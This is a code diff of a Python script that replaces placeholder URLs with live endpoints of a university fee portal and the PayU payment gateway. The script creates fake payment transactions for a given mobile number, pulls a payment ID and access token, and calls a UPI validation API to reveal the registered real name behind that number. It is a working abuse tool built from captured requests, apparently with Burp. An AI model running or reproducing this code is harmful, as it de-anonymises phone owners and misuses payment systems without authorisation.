@@ -36,20 +36,20 @@ def get_hash_value(html_content):
 
 # Send GET request to the payment page and extract the hash value
 def _get_hash(mobileno, random_email, random4letter):
-    url = f"https://example.com/PaymentGatway/PaymentGateway/MakePayment?merchantTxnID=FSTKN74522154{mobileno}&orderAmount=1830&MobielNo={mobileno}&EmailID={random_email}&firstName={random4letter}%20rathod&Description=Affiliated%20University%20Fees%20For%20First%20Year%20%20A.Y.2024-25%20%28PG%20Programme%29%20%5BPRN%2098989898%5D%20%5Bbfarm%5D&requestNumber=FSTKN0000309048300&isNeftChallanFromPG=False&payExpiry=01%2F01%2F0001%2000%3A00%3A00&IsPayExpiry=False&PGiD=4"
+    url = f"https://dbatu.unisuite.in/PaymentGatway/PaymentGateway/MakePayment?merchantTxnID=FSTKN74522154{mobileno}&orderAmount=1830&MobielNo={mobileno}&EmailID={random_email}&firstName={random4letter}%20rathod&Description=Affiliated%20University%20Fees%20For%20First%20Year%20%20A.Y.2024-25%20%28PG%20Programme%29%20%5BPRN%2098989898%5D%20%5Bbfarm%5D&requestNumber=FSTKN0000309048300&isNeftChallanFromPG=False&payExpiry=01%2F01%2F0001%2000%3A00%3A00&IsPayExpiry=False&PGiD=4"
     response = requests.get(url, headers=HEADERS)
     return get_hash_value(response.text)
 
 
 def _get_pid(mobileno, random_email, hash_value, random4letter):
-    burp0_url = "https://example.com:443/_payment"
+    burp0_url = "https://secure.payu.in:443/_payment"
     burp0_data = {
         "pgEnquiryBy": "2", "drop_category": "NEFTRTGS", "udf1": '', "udf2": '', "udf3": '',
         "udf4": '', "udf5": '', "hash": hash_value, "txnid": "FSTKN74522154"+mobileno, "amount": "1830",
         "phone": mobileno, "email": random_email, "surl": "https://DBATU.unisuite.in/PaymentGatway/PaymentGateway/gatewayresponse",
-        "curl": "https://example.com/PaymentGatway/PaymentGateway/gatewayresponse",
-        "furl": "https://example.com/PaymentGatway/PaymentGateway/gatewayresponse", "firstname": random4letter + " rathod",
-        "productinfo": "Affiliated example.com  AY202", "key": "Xp7re3"
+        "curl": "https://DBATU.unisuite.in/PaymentGatway/PaymentGateway/gatewayresponse",
+        "furl": "https://DBATU.unisuite.in/PaymentGatway/PaymentGateway/gatewayresponse", "firstname": random4letter + " rathod",
+        "productinfo": "Affiliated University Fees For First Year  AY202", "key": "Xp7re3"
     }
     response = requests.post(burp0_url, headers=HEADERS, data=burp0_data, allow_redirects=False)
     location = response.headers.get('Location')
@@ -57,7 +57,7 @@ def _get_pid(mobileno, random_email, hash_value, random4letter):
 
 def _get_token(pid):
     r = requests.get(
-        f"https://example.com/checkoutx?paymentId={pid}",
+        f"https://api.payu.in/checkoutx?paymentId={pid}",
         headers=HEADERS,
         timeout=15
     )
@@ -85,7 +85,7 @@ def resolve_true_name(mobile: str):
             return None, "token_failed"
 
         r = requests.get(
-            f"https://example.com/utilities/vpas/{mobile}/validate"
+            f"https://api.payu.in/utilities/vpas/{mobile}/validate"
             f"?paymentId={pid}&mapperFlow=1&access_token={token}",
             headers=HEADERS,
             timeout=15
